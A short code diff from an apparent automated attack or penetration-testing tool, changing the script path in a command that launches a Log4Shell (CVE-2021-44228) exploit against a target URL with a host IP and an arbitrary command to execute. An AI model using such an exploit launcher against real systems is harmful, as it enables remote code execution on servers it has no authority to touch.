@@ -351,7 +351,7 @@ class Trainman:
         env['PATH'] = env['PATH'] + f':/root/.jabba/jdk/adopt@1.8.0-292/bin'
         exploit_cve_2021_44228_cmd = [
             'python3',
-            '/L4sh/main.py',
+            'main.py',
             '-i', f'{self.host_info[2]}',
             '-u', f'{target_url}',
             '-c', f'{exec_cmd}',
